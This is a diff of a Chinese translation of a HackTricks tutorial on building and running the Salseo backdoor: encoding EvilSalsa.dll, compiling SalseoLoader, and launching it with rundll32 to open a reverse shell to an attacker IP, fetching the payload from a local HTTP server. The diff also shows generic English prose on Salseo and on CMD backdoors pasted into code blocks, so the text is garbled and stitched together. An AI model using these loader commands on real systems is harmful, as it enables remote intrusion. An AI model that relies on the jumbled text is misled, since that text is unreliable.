@@ -30,7 +30,7 @@
 
 ## 准备后门
 
-首先，你需要对**EvilSalsa.dll**进行编码。你可以使用python脚本**encrypterassembly.py**或者编译项目**EncrypterAssembly**：
+首先，你需要对**EvilSalsa.dll**进行编码。你可以使用python脚本**encrypterassembly.py**或者编译项目**EncrypterAssembly**来进行编码：
 
 ### **Python**
 ```
@@ -57,35 +57,33 @@ The backdoor is capable of performing various malicious activities, including:
 
 4. **File Manipulation**: The backdoor can create, modify, or delete files on the compromised system, giving the attacker the ability to plant additional malware or tamper with existing files.
 
-5. **System Surveillance**: Salseo can gather system information, such as installed software, hardware details, and network configurations, providing the attacker with valuable insights for further exploitation.
+5. **System Surveillance**: Salseo can gather information about the infected system, such as hardware specifications, installed software, and network configurations. This information can be used to identify potential vulnerabilities or gather intelligence for future attacks.
 
 ##### Infection Vectors
 
 The Salseo backdoor can be delivered through various infection vectors, including:
 
-1. **Phishing Emails**: Malicious attachments or links in phishing emails can lead to the installation of the backdoor when clicked or opened.
+1. **Email Attachments**: Malicious email attachments, such as infected documents or executables, can be used to deliver the backdoor to unsuspecting users.
 
-2. **Drive-by Downloads**: Visiting compromised or malicious websites can trigger the automatic download and execution of the backdoor without the user's knowledge.
+2. **Drive-by Downloads**: Visiting compromised or malicious websites can result in the automatic download and execution of the Salseo backdoor.
 
-3. **Exploit Kits**: Salseo can be delivered through exploit kits that target vulnerabilities in outdated software or plugins, allowing the attacker to gain unauthorized access.
-
-4. **Malicious Downloads**: Downloading and executing files from untrusted sources can result in the installation of the backdoor.
+3. **Exploiting Vulnerabilities**: The backdoor can be delivered by exploiting vulnerabilities in software or operating systems, allowing the attacker to gain unauthorized access to the target system.
 
 ##### Detection and Prevention
 
-To detect and prevent the Salseo backdoor, consider the following measures:
+Detecting and preventing the Salseo backdoor requires a multi-layered approach, including:
 
-1. **Antivirus Software**: Keep your antivirus software up to date and perform regular scans to detect and remove any malware, including the Salseo backdoor.
+1. **Antivirus Software**: Regularly update and use reputable antivirus software to detect and remove known malware signatures associated with the Salseo backdoor.
 
-2. **Patch Management**: Ensure that all software and plugins are updated with the latest security patches to mitigate vulnerabilities that could be exploited by the backdoor.
+2. **Patch Management**: Keep software and operating systems up to date with the latest security patches to mitigate vulnerabilities that could be exploited by the backdoor.
 
-3. **Email Security**: Implement email security measures, such as spam filters and email authentication protocols, to prevent phishing emails from reaching users' inboxes.
+3. **Email Security**: Implement email security measures, such as spam filters and email scanning, to prevent malicious attachments from reaching users' inboxes.
 
-4. **User Education**: Train users to recognize and avoid suspicious emails, links, and downloads to minimize the risk of inadvertently installing the backdoor.
+4. **User Education**: Train users to recognize and avoid suspicious emails, websites, and downloads that could potentially deliver the Salseo backdoor.
 
-5. **Network Monitoring**: Monitor network traffic for any suspicious communication patterns or connections to known malicious C2 servers associated with the Salseo backdoor.
+5. **Network Monitoring**: Implement network monitoring tools to detect unusual network traffic patterns that may indicate the presence of the backdoor.
 
-By implementing these security measures, you can enhance the protection of your Windows systems against the Salseo backdoor and other similar threats.
+By implementing these measures, organizations can enhance their security posture and reduce the risk of falling victim to the Salseo backdoor.
 ```
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
@@ -147,7 +145,7 @@ SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
 
 ### 在主函数之前添加：\[DllExport]
 
-![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 ### 为该项目安装DllExport
 
@@ -205,7 +203,7 @@ rundll32.exe SalseoLoader.dll,main
 ```
 如果没有出现错误，那么你可能有一个功能正常的DLL！！
 
-## 使用DLL获取一个shell
+## 使用DLL获取shell
 
 不要忘记使用一个**HTTP** **服务器**并设置一个**nc** **监听器**
 
@@ -222,11 +220,19 @@ rundll32.exe SalseoLoader.dll,main
 
 CMD (Command Prompt) is a command-line interpreter in Windows operating systems. It provides a text-based interface for executing commands and managing the system. CMD can be used to perform various tasks, such as navigating through directories, running programs, and managing files and processes.
 
-CMD is a powerful tool for hackers as it allows them to execute commands and scripts on a target system. By gaining access to CMD, hackers can exploit vulnerabilities, escalate privileges, and gain control over the target system.
+CMD is a powerful tool for hackers as it allows them to execute commands and scripts on a target system. By gaining access to CMD, hackers can perform a wide range of activities, including reconnaissance, privilege escalation, and data exfiltration.
 
-To access CMD, you can open the Start menu, type "cmd" in the search bar, and press Enter. This will open the Command Prompt window, where you can start executing commands.
+To exploit CMD, hackers often use backdoors to gain persistent access to a compromised system. A backdoor is a hidden entry point that allows unauthorized access to a system. By installing a backdoor on a target system, hackers can maintain access even if the system is patched or the user's password is changed.
 
-It is important to note that CMD should only be used for legitimate purposes, such as system administration or troubleshooting. Using CMD for malicious activities is illegal and unethical.
+There are several ways to create a backdoor in CMD. One common method is to use the "netsh" command to create a persistent backdoor. The "netsh" command is a powerful utility that allows users to configure network settings. By using the "netsh" command, hackers can create a backdoor that listens for incoming connections and provides them with remote access to the compromised system.
+
+Another method is to use the "reg" command to create a backdoor in the Windows Registry. The Windows Registry is a hierarchical database that stores configuration settings and options for the operating system. By modifying the Registry, hackers can create a backdoor that is executed every time the system starts up, providing them with persistent access to the compromised system.
+
+In addition to creating backdoors, hackers can also use CMD to execute various commands and scripts on a target system. For example, they can use CMD to run password-cracking tools, launch denial-of-service attacks, or download and execute malicious payloads.
+
+To protect against CMD-based attacks, it is important to implement strong security measures, such as regularly updating the operating system and using strong passwords. Additionally, monitoring network traffic and using intrusion detection systems can help detect and prevent unauthorized access to CMD.
+
+By understanding how CMD works and the various techniques used by hackers, you can better protect your systems and networks from potential attacks.
 ```
 set pass=password
 set payload=http://10.2.0.5/evilsalsax64.dll.txt
@@ -237,12 +243,12 @@ rundll32.exe SalseoLoader.dll,main
 ```
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* 你在一家 **网络安全公司** 工作吗？想要在 HackTricks 中 **宣传你的公司** 吗？或者你想要获取 **PEASS 的最新版本或下载 HackTricks 的 PDF** 吗？请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)！
-* 发现我们的独家 [**NFTs**](https://opensea.io/collection/the-peass-family) 集合 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
-* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
-* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或者 [**Telegram 群组**](https://t.me/peass) 或者 **关注** 我的 **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **通过向** [**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**
+* 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者你想要**获取PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
+* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
+* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**推特**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**
 
 </details>
